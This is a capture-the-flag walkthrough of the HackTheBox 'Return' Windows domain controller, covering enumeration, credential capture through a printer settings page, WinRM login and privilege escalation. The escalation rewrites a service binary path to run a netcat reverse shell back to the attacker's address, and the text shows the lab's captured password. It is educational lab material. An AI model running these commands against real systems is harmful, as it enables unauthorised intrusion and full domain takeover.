---
Primary_category: "[[EASY]]"
title: "RETURN"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[EASY]]

#### Summary

- ***Summary A***
- ***Summary B***
- ***Summary C***
- ***Summary D***
- ***Summary E***

![[RETURN-20250220155149089.webp|400]]

---

#### Setup

Directory creation with the Machine's Name

```bash
mkdir Return && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

> ***[[ZSH CUSTOM FUNCTIONS#mkt|Reference]]***

```bash
mkt
```

> [!IMPORTANT]- *Tree*
>
> ```bash
> .
> ├── evidence
> │   ├── creds
> │   ├── data
> │   └── screenshots
> ├── logs
> ├── scans
> ├── scope
> └── tools
> ```
>

---

#### Recon

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash
ping -c1 10.129.95.241
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.95.241 (10.129.95.241) 56(84) bytes of data.
> 64 bytes from 10.129.95.241: icmp_seq=1 ttl=127 time=48.0 ms
> 
> --- 10.129.95.241 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 48.017/48.017/48.017/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***Windows Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.95.241
```

> [!BUG]- *AllPorts*
>
> ```bash
> # Nmap 7.94SVN scan initiated Thu Feb 20 15:54:12 2025 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping -oG allPorts 10.129.95.241
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.95.241 ()	Status: Up
> Host: 10.129.95.241 ()	Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49671/open/tcp/////, 49674/open/tcp/////, 49675/open/tcp/////, 49676/open/tcp/////, 49680/open/tcp/////, 49688/open/tcp/////, 49698/open/tcp/////
> # Nmap done at Thu Feb 20 15:54:25 2025 -- 1 IP address (1 host up) scanned in 12.56 seconds
> ```
>

**Open Ports** → 

```bash
53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, 49664, 49665, 49666, 49667, 49671, 49674, 49675, 49676, 49680, 49688 and 49698
```

###### *Comprehensive Scan*

The *[[ZSH CUSTOM FUNCTIONS#extractPorts|ExtractPorts]]* utility is used to get a **Readable Summary** of the previous scan and have ***all Open Ports copied to the clipboard***

```bash
extractPorts allPorts
```

> [!BUG]- *ExtractPorts*
>
> ```bash
> [+] Extracting information...
> 
>     [+] IP Address: 10.129.95.241
>     [+] Open Ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49680,49688,49698
> 
> [+] Ports Copied to Clipboard
> ```
>

Then, the ***Comprehensive Scan*** is performed to gather the ***Service and Version*** running on each open port and launch a set of ***Nmap Basic Recon Scripts***

Note that this scan is also exported to have evidence at hand

```bash
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49680,49688,49698 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.95.241
```

> [!BUG]- *Targeted*
>
> ```bash
> # Nmap 7.94SVN scan initiated Thu Feb 20 15:57:57 2025 as: nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49680,49688,49698 -sCV -n -Pn --disable-arp-ping -oN targeted 10.129.95.241
> Nmap scan report for 10.129.95.241
> Host is up (0.11s latency).
> 
> PORT      STATE SERVICE       VERSION
> 53/tcp    open  domain        Simple DNS Plus
> 80/tcp    open  http          Microsoft IIS httpd 10.0
> |_http-title: HTB Printer Admin Panel
> |_http-server-header: Microsoft-IIS/10.0
> | http-methods: 
> |_  Potentially risky methods: TRACE
> 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-20 15:16:40Z)
> 135/tcp   open  msrpc         Microsoft Windows RPC
> 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
> 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
> 445/tcp   open  microsoft-ds?
> 464/tcp   open  kpasswd5?
> 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
> 636/tcp   open  tcpwrapped
> 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
> 3269/tcp  open  tcpwrapped
> 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> |_http-server-header: Microsoft-HTTPAPI/2.0
> |_http-title: Not Found
> 9389/tcp  open  mc-nmf        .NET Message Framing
> 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> |_http-server-header: Microsoft-HTTPAPI/2.0
> |_http-title: Not Found
> 49664/tcp open  msrpc         Microsoft Windows RPC
> 49665/tcp open  msrpc         Microsoft Windows RPC
> 49666/tcp open  msrpc         Microsoft Windows RPC
> 49667/tcp open  msrpc         Microsoft Windows RPC
> 49671/tcp open  msrpc         Microsoft Windows RPC
> 49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
> 49675/tcp open  msrpc         Microsoft Windows RPC
> 49676/tcp open  msrpc         Microsoft Windows RPC
> 49680/tcp open  msrpc         Microsoft Windows RPC
> 49688/tcp open  msrpc         Microsoft Windows RPC
> 49698/tcp open  msrpc         Microsoft Windows RPC
> Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
> 
> Host script results:
> | smb2-security-mode: 
> |   3:1:1: 
> |_    Message signing enabled and required
> | smb2-time: 
> |   date: 2025-02-20T15:17:37
> |_  start_date: N/A
> |_clock-skew: 18m36s
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Thu Feb 20 15:59:11 2025 -- 1 IP address (1 host up) scanned in 74.08 seconds
> ```
>

We see ports related to services such as *LDAP*, *Kerberos* and *DNS* . Therefore, we can assume that we are dealing with a *DC (Domain Controller)*

Note that this type of servers has many open ports as an *Active Directory* deploys a large number of services

So, let's keep calm and go step by step listing all the ports and their related services

##### *139, 445 - SMB*

###### *Extraction of General Information*

With the *Domain Controllers* and *Windows machines*, one thing that I like to do before anything else is to use `netexec` to connect via `smb` to the *target* and extract some information such as the *Host Name*, the *Domain name* (In case It is a *DC*) and if the *target* has the *SMB Signing* enabled and whether it uses *SMBv1*

```bash
nxc smb 10.129.95.241
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
> ```
> 

And we got that the *machine's name* is *Printer* and the domain is *return.local*

Moreover, we now know that the *Machines's OS* is likely to be a *Windows Server 2019*

Since we have a valid domain name and a host name, let's add them to the `/etc/hosts` file to refer to the *IP Address* we have

```bash
printf "\n10.129.95.241\tprinter\treturn.local\tprinter.return.local" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> # Others
> 
> 10.129.95.241   printer return.local    printer.return.local
> ```
>

###### *List Shared Resources*

We can try to list the available *SMB shares*, if there are any, using `netexec` again

Since we do not have any valid credentials, let's try a *Null Authentication* as follows

```bash
nxc smb printer --username '' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB                      10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
> SMB                      10.129.95.241   445    PRINTER          [+] return.local\: 
> SMB                      10.129.95.241   445    PRINTER          [-] Error enumerating shares: STATUS_ACCESS_DENIED
> ```
>

It gives us an *STATUS_ACCESS_DENIED*, so we know that *Null Authentication* is not enabled

We could try to authenticate with a random username

```bash
nxc smb printer --username 'anyRandomUser' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB                      10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
> SMB                      10.129.95.241   445    PRINTER          [-] return.local\anyRandomUser: STATUS_LOGON_FAILURE 
> ```
>

The same story here...

Let's check if the *Guest* user is enabled in the *target*

```bash
nxc smb printer --username 'guest' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB                      10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
> SMB                      10.129.95.241   445    PRINTER          [-] return.local\guest: STATUS_ACCOUNT_DISABLED 
> ```
>

And It is not!

So, there is no more we can really carry out here until we have some valid credentials

Let's move on to the next service!

##### *53 - DNS*

The *Domain Controller* is usually the *DNS Resolver* of the *Domain Client Machines*

We can start trying to list the version of this *DNS Server*  as follows

```bash
dig CHAOS TXT version.bind @10.129.95.241 +noall +answer
```

> [!NOTE]- *Command Output*
>
> ```bash
> ;; communications error to 10.129.95.241#53: timed out
> ;; communications error to 10.129.95.241#53: timed out
> ;; communications error to 10.129.95.241#53: timed out
> 
> ; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> CHAOS TXT version.bind @10.129.95.241 +noall +answer
> ;; global options: +cmd
> ;; no servers could be reached:
> ```
>

But we got a timeout from the *DC*

We can try to perform a *DNS Zone Transfer Attack*, so that we can obtain all the *DNS Records* of the  *DNS Zone* of a specific domain

```bash
dig axfr return.local @10.129.95.241 +noall +answer
```

> [!NOTE]- *Command Output*
>
> ```bash
> ; Transfer failed.
> ```
> 

As we can see, the *Zone Transfer* failed 😅

But if we use `dig` with the `ANY` directive to try to get any *DNS Records* from the same *DNS Zone* related to a certain domain

```bash
dig ANY return.local @10.129.95.241 +noall +answer
```

> [!NOTE]- *Command Output*
>
> ```bash
> return.local.		600	IN	A	10.129.95.241
> return.local.		3600	IN	NS	printer.return.local.
> return.local.		3600	IN	SOA	printer.return.local. hostmaster.return.local. 134 900 600 86400 3600
> return.local.		600	IN	AAAA	dead:beef::898:31d2:28d2:aeee
> ```
>

And we have some interesting *DNS Records* such as *printer.return.local* and *hostmaster.return.local*

Let's add them to the `/etc/hosts` file

```bash
printf "\tprinter.return.local\thostmaster.return.local" >> /etc/hosts
```

> [!BUG]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> # Others
> 
> 10.129.95.241   printer return.local    printer.return.local    printer.return.local    hostmaster.return.local
> ```
>

Since port *80* related to a *Web Server* is open, we can think that it may be using *Virtual Hosts* in *IIS*

Therefore, It would not be the same to request an *HTTP Resource* using the *Host Header* with the value *return.local* instead of using *hostmaster.return.local*

##### *88 - Kerberos*

When I see that the *Kerberos* services is exposed from the *Domain Controller*, I start to think of *attack vectors* such as [[88 - KERBEROS#AS_REPRoast|AS_REPRoast]] or [[88 - KERBEROS#Kerberoasting|Kerberoasting]]

We must know any existing username in the *DN* to be able to perform both attacks

Right now we do not have anyone, but we can use tools such as ***[kerbrute](https://github.com/ropnop/kerbrute)*** in order to list any valid *username* in the *target*

###### *User Enumeration via Kerbrute*

> ***[Reference](https://github.com/ropnop/kerbrute)***

First of all, *git clone* the repository and compile the *Go* source code as follows →

```bash
git clone "https://github.com/ropnop/kerbrute" kerbrute
```

```bash
cd !$ && go build -ldflags "-s -w" -o kerbrute .
```

Once the above is done, we can use *kerbrute's usernum module* to try to list any valid username according to a given *wordlist*

```bash
./kerbrute userenum --dc printer --domain return.local /usr/share/seclist/Usernames/xato-net-10-million-usernames.txt
```

If we let this scan running in the background while we continue with the remaning enumeration, we get the following results

> [!NOTE]- *Command Output*
>
> ```bash
> 
>     __             __               __     
>    / /_____  _____/ /_  _______  __/ /____ 
>   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
>  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
> /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
> 
> Version: dev (n/a) - 02/20/25 - Ronnie Flathers @ropnop
> 
> 2025/02/20 16:47:51 >  Using KDC(s):
> 2025/02/20 16:47:51 >  	printer:88
> 
> 2025/02/20 16:48:13 >  [+] VALID USERNAME:	administrator@return.local
> 2025/02/20 16:48:25 >  [+] VALID USERNAME:	printer@return.local
> ```
> 

We have two valid usernames, the *administrator* user always exists, as it happens with *root* on a *Linux Machine*, but the user *printer* is an interesting one

###### *AS_Rep Roasting*

We can create a file which contains this users and perform an *ASREPRoast attack*

```bash
printf "%s\n" "printer" > users.txt
```

> [!BUG]- *Users.txt*
>
> ```bash
> printer
> ```
>

Then, just use ***[GetNPusers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)*** from *Impacket* to check if any of the users within the provided file has the *UF_DONT_REQUIRE_PREAUTH* attribute enabled

The client first sends an *AS_REQ* without *Preauth* to the *AS (Application Service)* of the *KDC (Key Distribution Center)*

Then the *KDC* checks if the *requested user* has the *UF_DONT_REQUIRE_PREAUTH* attribute enabled

If not, it replies with the following error → ***`eRR-PREAUTH-REQUIRED`*** and the client has to send again an *ASP_REQ* but this time with a timestamp encrypted with the derived key of the given username

But, if the user has the above attribute enabled, then the *AS* replies with an *AS_REP* which contains two encrypted sections →

- ***Enc Data***

Data Chunk (Session Key, Timestamps and User Information) encrypted with the user's *NTLMv1* hash (*MD4*) using *RC4-HMAC* or with a *PBKDF2-SHA1* derived key from the user's *NTLMv1* hash using *AES-{128,256}*

- ***TGT***

The *Ticket Granting Ticket* of the user which is encrypted, like the *Enc Data*, using *RC4* with the user's *NTLMv1* hash as *symmetric key* or using *AES-256* having previously derived the *NTLMv1* hash via *PBKDF2-SHA1*

In this case, we obtains the following output →

```bash
[-] User printer doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Therefore, we know that the attribute is not enabled for this user and we have then received the error *eRR-PREAUTH-REQUIRED*

```bash
tshark --interface tun0 -Y "tcp.port == 88" 2> /dev/null 
```

> [!NOTE]- *Command Output*
>
> ```bash /error-code: eRR-PREAUTH-REQUIRED (25)/
> krb-error
>         pvno: 5
>         msg-type: krb-error (30)
>         stime: Feb 20, 2025 19:45:40.000000000 CET
>         susec: 508031
>         error-code: eRR-PREAUTH-REQUIRED (25)
>         realm: RETURN.LOCAL
>         sname
>             name-type: kRB5-NT-PRINCIPAL (1)
>             sname-string: 2 items
>                 SNameString: krbtgt
>                 SNameString: RETURN.LOCAL
> ```
>

The error code can be extracted as follows →

```bash
tshark --interface tun0 -Tfields -e kerberos.error_code -Y "tcp.port == 88" 2> /dev/null
```

So, we can do nothing more here as we do not know any more existing usernames and we do not have any valid credentials for any user to perform a *Kerberoasting Attack*

##### *135 - RCP*

The *port 135* related to the *RPC Endpoint Mapper* is open

As we did in the [[#*139, 445 - SMB*|SMB Section]], we can try to authenticate using a *Null Session*

```bash
rpcclient --user '' --no-pass --command 'srvinfo' printer
```

> [!NOTE]- *Command Output*
>
> ```bash
> do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
> ```
>

But we receive again an error *NT_STATUS_ACCESS_DENIED* as responde

The same applies if we try it with a random user

```bash
rpcclient --user 'anyRandomUser' --no-pass --command 'srvinfo' printer
```

> [!NOTE]- *Command Output*
>
> ```bash
> Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
> ```
>

This time we get *LOGON_FAILURE* since the user does not exist in the target

Lastly, we could check if the *guest* account is enabled, but we already verified it before using *SMB*

```bash
rpcclient --user 'guest%' --command 'srvinfo' printer
```

> [!NOTE]- *Command Output*
>
> ```bash
> Cannot connect to server.  Error was NT_STATUS_ACCOUNT_DISABLED
> ```
>

##### *80 - HTTP*

###### *Banner Grabbing*

We check the *HTTP Response Headers* using `curl`

```bash
curl --silent --request GET --location --head "http://10.129.95.241"
```

> [!NOTE]- *Command Output*
>
> ```bash
> HTTP/1.1 200 OK
> Content-Type: text/html; charset=UTF-8
> Server: Microsoft-IIS/10.0
> X-Powered-By: PHP/7.4.13
> Date: Thu, 20 Feb 2025 19:33:08 GMT
> Content-Length: 28274
> 
> ``` 
> 

According to the above headers, we know that the *Web Server* is a *Microsoft IIS* and the *Server-Side Language Programming* is *PHP*

###### *Browser-Based Inspection*

If we inspect the source code of the *index.php* resource, there is nothing interesting

- ***Index.php***

![[RETURN-20250220191803199.webp|350]]

Apart from the *index.php resource*, there is a *settings.php*, the remaining menu sections such as *Fax* and *Troubleshooting* are not working

- ***Settings.php***

![[RETURN-20250220191954553.webp|350]]

Before inspect the functionality of the above *PHP script*, let's apply fuzzing to discover resources such as directories or another *PHP* files

###### *Fuzzing*

To show different tools, we will use `feroxbuster` for the directory enumeration and `gobuster` for the *PHP* files enumeration

- ***Only Directories***

> ***[Reference](https://github.com/epi052/feroxbuster)***

```bash
feroxbuster --add-slash --threads 200 --output WebScan_directories --wordlist /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.129.95.241
```

> [!NOTE]- *Command Output*
>
> ```bash
> 404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
> 403      GET       29l       92w     1233c http://10.129.95.241/images/
> 200      GET       39l      196w    17216c http://10.129.95.241/images/1.png
> 200      GET     1345l     2796w    28274c http://10.129.95.241/index.php
> 200      GET     1376l     2855w    29090c http://10.129.95.241/settings.php
> 200      GET     1345l     2796w    28274c http://10.129.95.241/
> 403      GET       29l       92w     1233c http://10.129.95.241/Images/
> 403      GET       29l       92w     1233c http://10.129.95.241/IMAGES/
> [####################] - 2m    882202/882202  0s      found:7       errors:12     
> [####################] - 2m    220545/220545  1548/s  http://10.129.95.241/ 
> [####################] - 2m    220545/220545  1551/s  http://10.129.95.241/images/ 
> [####################] - 2m    220545/220545  1549/s  http://10.129.95.241/Images/ 
> ```
> 

Nothing interesting here

- ***Directories and PHP Files***

> ***[Reference](https://github.com/OJ/gobuster)***

```bash
gobuster dir --threads 200 --output fullWebScan --extensions php --wordlist /usr/share/seclist/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.129.95.241
```

> [!NOTE]- *Command Output*
>
>  ```bash
> /images               (Status: 301) [Size: 151] [--> http://10.129.95.241/images/]
> /index.php            (Status: 200) [Size: 28274]
> /Images               (Status: 301) [Size: 151] [--> http://10.129.95.241/Images/]
> /Index.php            (Status: 200) [Size: 28274]
> /settings.php         (Status: 200) [Size: 29090]
> /IMAGES               (Status: 301) [Size: 151] [--> http://10.129.95.241/IMAGES/]
> /INDEX.php            (Status: 200) [Size: 28274]
> /SETTINGS.php         (Status: 200) [Size: 29090]
>  ```
>
>

Nothing interesting here either

Remember that we discovered some subdomains when we listed the [[#*53 - DNS*|DNS]] service and mentioned that *Virtual Hosting* could be implemented by the *Web Server*

- ***printer.return.local***

- ***hostmaster.return.local***

In this case It does not apply, both subdomains offer the same content as the following *URL* → `http://10.129.95.241`

We could perform a *Virtual Host* enumeration using `gobuster`

```bash
gobuster vhost --append-domain --domain return.local --threads 200 --output vHostScan --wordlist /usr/share/seclist/Discovery/DNS/subdomains-top1million-110000.txt --url http://10.129.95.241
```

But we got nothing

Therefore, let's inspect further the *settings.php's form*

It seems that the *Password* field is filled with a string, we could try to inspect the *HTML* source code and modify the *type attribute* of the *input tag* from *password* to *text* in order to see the password in plain text

![[RETURN-20250220194550262.webp|275]]

But the value of the *type attribute* is already *text*, so we cannot do anything here

Let's use *Burpsuite* to intercept the request sent when the *Update* button is clicked

![[RETURN-20250220194956557.webp|450]]

Only one parameter is sent in the *POST HTTP Request* → *IP*

We could try to set the value of this *POST Parameter* to our *IP Address* having previously set up a listener on *port 389*

I have said *port 389* because is the default port that appears in the *Server Port* field in *settings.php*

```bash
nc -nlvp 389
```

> [!SUMMARY]- *HTTP Request*
>
> ```bash
> POST /settings.php HTTP/1.1
> Host: 10.129.95.241
> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
> Accept-Language: en-US,en;q=0.5
> Accept-Encoding: gzip, deflate, br
> Referer: http://10.129.95.241/settings.php
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 14
> Origin: http://10.129.95.241
> DNT: 1
> Sec-GPC: 1
> Connection: keep-alive
> Upgrade-Insecure-Requests: 1
> Priority: u=0, i
> 
> ip=10.10.16.24
> ```
>

> [!NOTE]- *Command Output*
>
> ```bash
> listening on [any] 389 ...
> connect to [10.10.16.24] from (UNKNOWN) [10.129.95.241] 58047
> return\svc-printer
>                        1edFg43012!!
> ```
> 

The last strings seems to be the value of the *Password field* as this field is the last one in the *settings.php form*

***User → svc-printer***

***Password → 1edFg43012!!***

We have another valid user, but, before proceeding to perform again, for this user, an *AS_REP Roast* attack, let's see if we can authenticate with him in the *DC* using the previous *password*

```bash
nxc smb printer --username 'svc-printer' --password '1edFg43012!!'
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
> SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
> ```
>

And we can! So this password is valid for the user *svc-printer*

---

#### Shell as System User via WinRM

> ***[Reference](https://github.com/Hackplayers/evil-winrm)***

Since *port 5985*, related to *WinRM*, is open, let's check if this user belongs to the *Remote Management Users* group and then we can connect to the *DC* using ***[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)***

We can also carry out the above validation using `netexec` and its `winrm` module

```bash
nxc winrm printer --username 'svc-printer' --password '1edFg43012!!'
```

> [!NOTE]- *Command Output*
>
> ```bash
> WINRM       10.129.95.241   5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
> WINRM       10.129.95.241   5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
> ```
>

And so can we. So use *Evil-WinRM* as follows to connect to the *target*

```bash
evil-winrm --ip 10.129.95.241 --user 'svc-printer' --password '1edFg43012!!'
```

And we're in! Now, we can go to the *Desktop* folder of the current user and grab the flag *user.txt* content

```bash
Get-Content C:\Users\svc-printer\Desktop\user.txt
```

---

#### Privesc #1

***Initial Non-Privileged User → svc-printer***

##### *Server Operators*

Once inside, before we proceed to inspect the *File System* and look for *sensitive files* or *CVEs* related to the *software* installed in the *target* and located in the *Program Files* and *Program Files (x86)* folders, let's see what privileges the current user has and to which groups the user belongs

```bash
whoami /groups
```

> [!NOTE]- *Command Output*
>
> ```bash
> GROUP INFORMATION
> -----------------
> 
> Group Name                                 Type             SID          Attributes
> ========================================== ================ ============ ==================================================
> Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
> BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
> BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
> BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
> BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
> BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
> NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
> Mandatory Label\High Mandatory Level       Label            S-1-16-12288
> ```
>

```bash
whoami /priv
```


> [!NOTE]- *Command Output*
>
> ```bash
> PRIVILEGES INFORMATION
> ----------------------
> 
> Privilege Name                Description                         State
> ============================= =================================== =======
> SeMachineAccountPrivilege     Add workstations to domain          Enabled
> SeLoadDriverPrivilege         Load and unload device drivers      Enabled
> SeSystemtimePrivilege         Change the system time              Enabled
> SeBackupPrivilege             Back up files and directories       Enabled
> SeRestorePrivilege            Restore files and directories       Enabled
> SeShutdownPrivilege           Shut down the system                Enabled
> SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
> SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
> SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
> SeTimeZonePrivilege           Change the time zone                Enabled
> ```
>

And the current user is member of the *Server Operators* group

> ***[Reference](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)***

A user which belongs to this *AD Security Group (Builtin Group)* can perform actions such as →

- ***Sign in to the Domain Controller***

- ***Create and Delete Network Shared Resources***

- ***Stop and Start Services***

- ***Backup and Restore Files***

Among other actions...

Therefore, since we do not have enough privileges to list the services available on the *target*, we can leverage of *Evil-WinRM* commands, such as `services`, in order to list all *running services* and their *binary path*

```bash
services
```

> [!NOTE]- *Command Output*
>
> ```bash
> Path                                                                                                                 Privileges Service          
>
> C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
> \??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
> C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
> "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
> C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
> "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
> "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
> "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
> "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
> "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc   
> ```
>

As we belong to the *Server Operators Security Group*, we can modify the *binary path* of a running service

When we restart that service, It will run its associated binary, in this case, the one that we have specified

Thus, we can upload a *netcat binary* to the *target* and refer to it when modifying the path of a particular service

This time, we will use ***[SMBServer.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)*** from *Impacket* to share the binary and copy it from the *DC*

###### *Binary Transfer to the Target via SMB*

- ***From the Attacker*** ⚔️

```bash
smbserver.py -smb2support -user 4l3xbb -password 4l3xbb test $(pwd)
```

- ***From the Target*** 🎯

```bash
net use Z: \\10.10.16.24\smbFolder /USER:al3xbb al3xbb
```

```bash
Copy-Item -Path 'Z:\nc.exe' -Destination 'C:\ProgramData\nc.exe'
```

###### *Modification of a Service's Binary Path*

Once we have uploaded the `nc.exe` binary to the *target*, just proceed as follows to modify the *binary path* of the services mentioned above, e.g. the *VMTools* service

```bash
sc.exe config VMTools binPath="C:\ProgramData\nc.exe -e powershell.exe 10.10.16.24 443"
```

> [!NOTE]- *Command Output*
>
> ```bash
> [SC] ChangeServiceConfig SUCCESS
> ```
>

If we run again the `services` command, we see that the *binary path* related to the above service has been modified correctly

```bash
services
```

> [!NOTE]- *Command Output*
>
> ```bash
> Path                                                                                                                 Privileges Service          
>
> C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
> \??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
> C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
> "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
> C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
> "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
